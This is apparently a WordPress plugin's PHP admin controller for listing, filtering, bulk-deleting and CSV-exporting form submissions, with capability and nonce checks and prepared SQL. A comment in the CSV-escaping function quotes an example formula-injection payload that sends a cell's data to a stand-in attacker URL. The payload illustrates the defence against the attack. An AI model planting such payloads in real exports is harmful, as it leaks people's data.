<?php
/**
 * Submissions list controller — query + CSV export.
 *
 * @package BSPE\Connect\Admin
 */

namespace BSPE\Connect\Admin;

use BSPE\Connect\Submissions;

defined( 'ABSPATH' ) || exit;

final class Submissions_Controller {

	public const PER_PAGE = 25;

	public const EXPORT_ACTION = 'bspe_connect_export_csv';
	public const EXPORT_NONCE  = 'bspe_connect_export';

	public const DELETE_SELECTED_ACTION = 'bspe_connect_submissions_delete_selected';
	public const DELETE_SELECTED_NONCE  = 'bspe_connect_submissions_delete_selected';
	public const DELETE_ALL_ACTION      = 'bspe_connect_submissions_delete_all';
	public const DELETE_ALL_NONCE       = 'bspe_connect_submissions_delete_all';

	public static function init(): void {
		add_action( 'admin_post_' . self::EXPORT_ACTION,          [ self::class, 'export_csv' ] );
		add_action( 'admin_post_' . self::DELETE_SELECTED_ACTION, [ self::class, 'handle_delete_selected' ] );
		add_action( 'admin_post_' . self::DELETE_ALL_ACTION,      [ self::class, 'handle_delete_all' ] );
	}

	/**
	 * Hard-delete the submission IDs posted from the bulk checkboxes.
	 * Capability + nonce gated; bounded to MAX_DELETE_BATCH by the
	 * Submissions class. Redirects back to the submissions tab, preserving
	 * filter state, with a flash message in the URL.
	 */
	public static function handle_delete_selected(): void {
		if ( ! current_user_can( Admin::CAPABILITY ) ) {
			wp_die( esc_html__( 'You do not have permission to delete submissions.', 'bspe-connect' ), 403 );
		}
		check_admin_referer( self::DELETE_SELECTED_NONCE );

		$raw_ids = isset( $_POST['ids'] ) && is_array( $_POST['ids'] )
			? wp_unslash( $_POST['ids'] )
			: [];

		$ids = [];
		foreach ( $raw_ids as $value ) {
			$n = (int) $value;
			if ( $n > 0 ) {
				$ids[] = $n;
			}
		}

		$deleted = \BSPE\Connect\Submissions::delete_by_ids( $ids );

		\BSPE\Connect\Logger::log(
			$deleted > 0 ? 'warn' : 'info',
			$deleted > 0 ? 'Submissions hard-deleted (bulk)' : 'Bulk delete request matched no rows',
			[
				'deleted'      => $deleted,
				'requested'    => count( $ids ),
				'admin_user'   => get_current_user_id(),
			]
		);

		self::redirect_back_with_flash( 'deleted_selected', $deleted );
	}

	/**
	 * Hard-delete every submission matching the filter state posted from
	 * the "Delete all matching" form. The filter values are re-validated
	 * via read_filters_from_post() so a hostile POST can't bypass the
	 * status / source allowlists.
	 */
	public static function handle_delete_all(): void {
		if ( ! current_user_can( Admin::CAPABILITY ) ) {
			wp_die( esc_html__( 'You do not have permission to delete submissions.', 'bspe-connect' ), 403 );
		}
		check_admin_referer( self::DELETE_ALL_NONCE );

		$filters = self::read_filters_from_post();
		[ $where_sql, $where_args ] = self::build_where_clause( $filters );

		$deleted = \BSPE\Connect\Submissions::delete_by_where( $where_sql, $where_args );

		\BSPE\Connect\Logger::log(
			$deleted > 0 ? 'warn' : 'info',
			$deleted > 0 ? 'Submissions hard-deleted (all matching filters)' : 'Delete-all matched no rows',
			[
				'deleted'    => $deleted,
				'filters'    => $filters,
				'admin_user' => get_current_user_id(),
			]
		);

		self::redirect_back_with_flash( 'deleted_all', $deleted, $filters );
	}

	/**
	 * Parse the same filter set as read_filters_from_request() but from
	 * $_POST instead of $_GET. Used by the delete-all handler so the
	 * delete is scoped to the filters the admin actually saw.
	 *
	 * @return array{from:string,to:string,source:string,status:string,paged:int}
	 */
	private static function read_filters_from_post(): array {
		// phpcs:disable WordPress.Security.NonceVerification.Missing -- nonce verified by caller via check_admin_referer
		$from   = isset( $_POST['from'] )   ? sanitize_text_field( wp_unslash( (string) $_POST['from'] ) )   : '';
		$to     = isset( $_POST['to'] )     ? sanitize_text_field( wp_unslash( (string) $_POST['to'] ) )     : '';
		$source = isset( $_POST['source'] ) ? sanitize_key( wp_unslash( (string) $_POST['source'] ) )         : 'all';
		$status = isset( $_POST['status'] ) ? sanitize_key( wp_unslash( (string) $_POST['status'] ) )         : 'all';
		// phpcs:enable

		return [
			'from'   => self::clean_date( $from ),
			'to'     => self::clean_date( $to ),
			'source' => in_array( $source, [ 'text', 'email', 'all' ], true ) ? $source : 'all',
			'status' => in_array( $status, [ 'sent', 'failed', 'pending', 'all' ], true ) ? $status : 'all',
			'paged'  => 1,
		];
	}

	/**
	 * Build the redirect URL after a delete operation. Re-applies the
	 * filter state so the admin lands back on the same view they were
	 * looking at (minus the rows that just got removed). Flash params
	 * are read by the view to render a one-time success notice.
	 *
	 * @param array<string,mixed>|null $filters
	 */
	private static function redirect_back_with_flash( string $kind, int $deleted, ?array $filters = null ): void {
		$args = [
			'page'         => Admin::PAGE_SLUG,
			'tab'          => 'submissions',
			'bspe_flash'   => $kind,
			'bspe_count'   => $deleted,
		];
		if ( null !== $filters ) {
			if ( '' !== $filters['from'] )   { $args['from']   = $filters['from']; }
			if ( '' !== $filters['to'] )     { $args['to']     = $filters['to']; }
			if ( 'all' !== $filters['source'] ) { $args['source'] = $filters['source']; }
			if ( 'all' !== $filters['status'] ) { $args['status'] = $filters['status']; }
		}
		wp_safe_redirect( add_query_arg( $args, admin_url( 'admin.php' ) ) );
		exit;
	}

	/**
	 * Resolve filters from $_GET, returning a sanitized array suitable for
	 * passing to query() and for re-rendering the form.
	 *
	 * @return array{from:string,to:string,source:string,status:string,paged:int}
	 */
	public static function read_filters_from_request(): array {
		// phpcs:disable WordPress.Security.NonceVerification.Recommended -- read-only listing
		$from   = isset( $_GET['from'] )   ? sanitize_text_field( wp_unslash( (string) $_GET['from'] ) )   : '';
		$to     = isset( $_GET['to'] )     ? sanitize_text_field( wp_unslash( (string) $_GET['to'] ) )     : '';
		$source = isset( $_GET['source'] ) ? sanitize_key( wp_unslash( (string) $_GET['source'] ) )         : 'all';
		$status = isset( $_GET['status'] ) ? sanitize_key( wp_unslash( (string) $_GET['status'] ) )         : 'all';
		$paged  = isset( $_GET['paged'] )  ? max( 1, (int) $_GET['paged'] )                                  : 1;
		// phpcs:enable

		return [
			'from'   => self::clean_date( $from ),
			'to'     => self::clean_date( $to ),
			'source' => in_array( $source, [ 'text', 'email', 'all' ], true ) ? $source : 'all',
			'status' => in_array( $status, [ 'sent', 'failed', 'pending', 'all' ], true ) ? $status : 'all',
			'paged'  => $paged,
		];
	}

	/**
	 * Query submissions with optional filters and pagination.
	 *
	 * @param array{from?:string,to?:string,source?:string,status?:string,paged?:int,per_page?:int|null} $filters
	 *
	 * @return array{rows:array<int,array<string,mixed>>,total:int,per_page:int}
	 */
	public static function query( array $filters ): array {
		global $wpdb;
		$table = Submissions::table();

		[ $where_sql, $where_args ] = self::build_where_clause( $filters );

		$per_page = $filters['per_page'] ?? self::PER_PAGE;
		$paged    = max( 1, (int) ( $filters['paged'] ?? 1 ) );

		// Count.
		$count_sql = "SELECT COUNT(*) FROM {$table} WHERE {$where_sql}";
		// phpcs:ignore WordPress.DB.PreparedSQL.NotPrepared, WordPress.DB.DirectDatabaseQuery.DirectQuery, WordPress.DB.DirectDatabaseQuery.NoCaching
		$total = empty( $where_args ) ? (int) $wpdb->get_var( $count_sql ) : (int) $wpdb->get_var( $wpdb->prepare( $count_sql, $where_args ) );

		// Data.
		if ( null === $per_page ) {
			$limit_sql = '';
			$args      = $where_args;
		} else {
			$offset    = ( $paged - 1 ) * $per_page;
			$limit_sql = ' LIMIT %d OFFSET %d';
			$args      = array_merge( $where_args, [ $per_page, $offset ] );
		}

		$sql = "SELECT id, submitted_at, source_button, name, phone, email, message, contact_pref, page_url, user_agent, ip_hash, mail_status FROM {$table} WHERE {$where_sql} ORDER BY submitted_at DESC, id DESC{$limit_sql}";
		// phpcs:ignore WordPress.DB.PreparedSQL.NotPrepared, WordPress.DB.DirectDatabaseQuery.DirectQuery, WordPress.DB.DirectDatabaseQuery.NoCaching
		$rows = empty( $args ) ? $wpdb->get_results( $sql, ARRAY_A ) : $wpdb->get_results( $wpdb->prepare( $sql, $args ), ARRAY_A );
		if ( ! is_array( $rows ) ) {
			$rows = [];
		}

		return [
			'rows'     => $rows,
			'total'    => $total,
			'per_page' => $per_page ?? $total ?: 1,
		];
	}

	/**
	 * @param array<string,mixed> $filters
	 *
	 * @return array{0:string,1:array<int,mixed>}
	 */
	public static function build_where_clause( array $filters ): array {
		$where = [ '1=1' ];
		$args  = [];

		$from = (string) ( $filters['from'] ?? '' );
		if ( '' !== $from ) {
			$where[] = 'submitted_at >= %s';
			$args[]  = $from . ' 00:00:00';
		}
		$to = (string) ( $filters['to'] ?? '' );
		if ( '' !== $to ) {
			$where[] = 'submitted_at <= %s';
			$args[]  = $to . ' 23:59:59';
		}

		$source = (string) ( $filters['source'] ?? 'all' );
		if ( 'all' !== $source ) {
			$where[] = 'source_button = %s';
			$args[]  = $source;
		}

		$status = (string) ( $filters['status'] ?? 'all' );
		if ( 'all' !== $status ) {
			$where[] = 'mail_status = %s';
			$args[]  = $status;
		}

		return [ implode( ' AND ', $where ), $args ];
	}

	private static function clean_date( string $raw ): string {
		$raw = trim( $raw );
		if ( '' === $raw ) {
			return '';
		}
		// Expect YYYY-MM-DD (HTML date input native format).
		if ( ! preg_match( '/^\d{4}-\d{2}-\d{2}$/', $raw ) ) {
			return '';
		}
		$ts = strtotime( $raw );
		if ( false === $ts ) {
			return '';
		}
		return gmdate( 'Y-m-d', $ts );
	}

	/**
	 * Stream submissions as CSV. Honors the same filter set as the table view
	 * but ignores pagination.
	 */
	public static function export_csv(): void {
		if ( ! current_user_can( Admin::CAPABILITY ) ) {
			wp_die( esc_html__( 'You do not have permission to export submissions.', 'bspe-connect' ), 403 );
		}
		check_admin_referer( self::EXPORT_NONCE );

		$filters             = self::read_filters_from_request();
		$filters['per_page'] = null; // disable pagination — export all matching rows.

		$result = self::query( $filters );
		$rows   = $result['rows'];

		$filename = 'bspe-connect-submissions-' . gmdate( 'Y-m-d-His' ) . '.csv';

		nocache_headers();
		header( 'Content-Type: text/csv; charset=utf-8' );
		header( 'Content-Disposition: attachment; filename="' . $filename . '"' );

		$out = fopen( 'php://output', 'w' );
		if ( false === $out ) {
			exit;
		}

		fputcsv( $out, [
			'ID',
			'Submitted at',
			'Source',
			'Name',
			'Phone',
			'Email',
			'Message',
			'Preferred contact',
			'Page URL',
			'Mail status',
			'IP hash',
		] );

		foreach ( $rows as $row ) {
			fputcsv( $out, [
				self::csv_safe( (string) $row['id'] ),
				self::csv_safe( (string) $row['submitted_at'] ),
				self::csv_safe( (string) $row['source_button'] ),
				self::csv_safe( (string) $row['name'] ),
				self::csv_safe( (string) $row['phone'] ),
				self::csv_safe( (string) $row['email'] ),
				self::csv_safe( (string) $row['message'] ),
				self::csv_safe( (string) ( $row['contact_pref'] ?? '' ) ),
				self::csv_safe( (string) $row['page_url'] ),
				self::csv_safe( (string) $row['mail_status'] ),
				self::csv_safe( (string) $row['ip_hash'] ),
			] );
		}

		fclose( $out );
		exit;
	}

	/**
	 * Defang formula-injection vectors before writing to a CSV cell.
	 *
	 * If a cell begins with =, +, -, @, TAB, or CR, Excel / Numbers /
	 * Google Sheets will interpret it as a formula on open — and an
	 * attacker who submits a name like
	 *   =HYPERLINK("https://attacker/?leak="&A1,"Click me")
	 * gets the row exfiltrated when an admin opens the export.
	 *
	 * Prepending a single quote prevents formula evaluation while keeping
	 * the visible value identical (spreadsheets hide the leading quote).
	 */
	private static function csv_safe( string $value ): string {
		if ( '' === $value ) {
			return $value;
		}
		$first = $value[0];
		if ( '=' === $first || '+' === $first || '-' === $first || '@' === $first || "\t" === $first || "\r" === $first ) {
			return "'" . $value;
		}
		return $value;
	}

	public static function export_url( array $filters ): string {
		$base = wp_nonce_url(
			add_query_arg(
				array_merge(
					[ 'action' => self::EXPORT_ACTION ],
					array_filter(
						[
							'from'   => $filters['from']   ?? '',
							'to'     => $filters['to']     ?? '',
							'source' => $filters['source'] ?? '',
							'status' => $filters['status'] ?? '',
						]
					)
				),
				admin_url( 'admin-post.php' )
			),
			self::EXPORT_NONCE
		);
		return $base;
	}

	/**
	 * Format phone digits for display.
	 */
	public static function format_phone( string $digits ): string {
		$d = preg_replace( '/\D/', '', $digits ) ?? '';
		if ( strlen( $d ) === 10 ) {
			return sprintf( '(%s) %s-%s', substr( $d, 0, 3 ), substr( $d, 3, 3 ), substr( $d, 6, 4 ) );
		}
		return $d;
	}
}
